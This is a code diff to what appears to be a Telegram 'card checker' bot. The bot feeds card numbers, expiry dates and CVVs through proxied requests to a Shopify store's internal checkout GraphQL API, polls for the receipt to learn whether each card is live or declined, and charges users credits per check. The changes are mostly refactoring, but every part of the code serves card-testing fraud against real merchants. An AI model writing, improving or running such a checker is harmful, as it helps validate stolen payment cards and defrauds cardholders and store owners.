@@ -1974,13 +2069,12 @@ class ShopifyTaffyCheckout:
             try:
                 submit_resp = resp.json()
                 
-                # Check for errors in response
                 if 'errors' in submit_resp and submit_resp['errors']:
                     error_msgs = []
                     for error in submit_resp['errors']:
                         error_code = error.get('code', 'UNKNOWN')
                         error_msgs.append(error_code)
-                    return False, f"DECLINED - {', '.join(error_msgs)}"
+                    return False, f"DECLINED - {', '.join(error_msgs[:3])}"
                 
                 data = submit_resp.get('data', {}).get('submitForCompletion', {})
                 receipt = data.get('receipt', {})
@@ -1991,7 +2085,6 @@ class ShopifyTaffyCheckout:
                 
                 self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
                 
-                # Check receipt type
                 receipt_type = receipt.get('__typename', '')
                 
                 if receipt_type == 'ProcessingReceipt':
@@ -2027,7 +2120,7 @@ class ShopifyTaffyCheckout:
             return False, f"Submit error: {str(e)[:50]}"
 
     async def poll_receipt(self, headers, max_polls=5):
-        """Step 10: Poll for receipt status - INCREASED TIMEOUT TO 30 SECONDS"""
+        """Step 10: Poll for receipt status"""
         self.step(10, "POLL RECEIPT", "Polling for payment status")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
@@ -2039,12 +2132,14 @@ class ShopifyTaffyCheckout:
             poll_attempts += 1
             
             try:
+                poll_variables = {
+                    "receiptId": self.receipt_id,
+                    "sessionToken": self.graphql_session_token
+                }
+                
                 poll_params = {
                     'operationName': 'PollForReceipt',
-                    'variables': json.dumps({
-                        "receiptId": self.receipt_id,
-                        "sessionToken": self.graphql_session_token
-                    }),
+                    'variables': json.dumps(poll_variables),
                     'id': self.poll_id
                 }
                 
@@ -2059,10 +2154,7 @@ class ShopifyTaffyCheckout:
                     # Try POST if GET fails
                     poll_payload = {
                         "operationName": "PollForReceipt",
-                        "variables": {
-                            "receiptId": self.receipt_id,
-                            "sessionToken": self.graphql_session_token
-                        },
+                        "variables": poll_variables,
                         "id": self.poll_id
                     }
                     resp = await self.client.post(
@@ -2136,7 +2228,7 @@ class ShopifyTaffyCheckout:
         return False, "DECLINED - TIMEOUT"
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Main checkout execution flow for saltwater taffy - OPTIMIZED VERSION"""
+        """Main checkout execution flow for saltwater taffy"""
         try:
             # Step 0: Get proxy
             self.step(0, "GET PROXY", "Getting proxy")
@@ -2155,7 +2247,7 @@ class ShopifyTaffyCheckout:
                 self.proxy_status = "No Proxy"
                 self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
             
-            # Step 1: Direct checkout access (skips product page and add to cart)
+            # Step 1: Direct checkout access
             success, result = await self.direct_checkout_access()
             if not success:
                 return False, result
@@ -2208,6 +2300,8 @@ class ShopifyTaffyCheckout:
         finally:
             if self.client:
                 await self.client.aclose()
+            if self.pci_client:
+                await self.pci_client.aclose()
 
 
 # ========== MAIN CHECKER CLASS ==========
@@ -2225,7 +2319,6 @@ class ShopifyTaffyChecker:
         self.logger.start_check(card_details)
 
         try:
-            # Use intelligent parser to extract card details
             parsed = parse_card_input(card_details)
             if not parsed:
                 elapsed_time = time.time() - start_time
@@ -2233,7 +2326,6 @@ class ShopifyTaffyChecker:
 
             cc, mes, ano, cvv = parsed
 
-            # Basic validation
             if not cc.isdigit() or len(cc) < 15:
                 elapsed_time = time.time() - start_time
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data, self.proxy_status)
@@ -2252,11 +2344,9 @@ class ShopifyTaffyChecker:
 
             self.logger.card_details_log(cc, mes, ano, cvv)
 
-            # Create checker instance
             checker = ShopifyTaffyCheckout(self.user_id)
             success, result = await checker.execute_checkout(cc, mes, ano, cvv)
             
-            # Update proxy status
             self.proxy_status = checker.proxy_status
 
             elapsed_time = time.time() - start_time
@@ -2342,9 +2432,7 @@ async def handle_shopify_taffy(client: Client, message: Message):
 <b>~ Note:</b> <code>Shopify Charge</code>""")
             return
 
-        # Get the full message text after the command
         full_text = message.text
-        # Remove the command part
         command_parts = full_text.split(maxsplit=1)
         if len(command_parts) < 2:
             await message.reply("Please provide card details")
@@ -2352,7 +2440,6 @@ async def handle_shopify_taffy(client: Client, message: Message):
         
         card_input = command_parts[1].strip()
 
-        # Parse using the intelligent parser
         parsed = parse_card_input(card_input)
         if not parsed:
             await message.reply("""<pre>❌ Invalid Format</pre>
@@ -2387,7 +2474,7 @@ async def handle_shopify_taffy(client: Client, message: Message):
                 result = await charge_processor.execute_charge_command(
                     user_id,
                     checker.check_card,
-                    card_input,  # Pass original input
+                    card_input,
                     username,
                     user_data,
                     credits_needed=2,
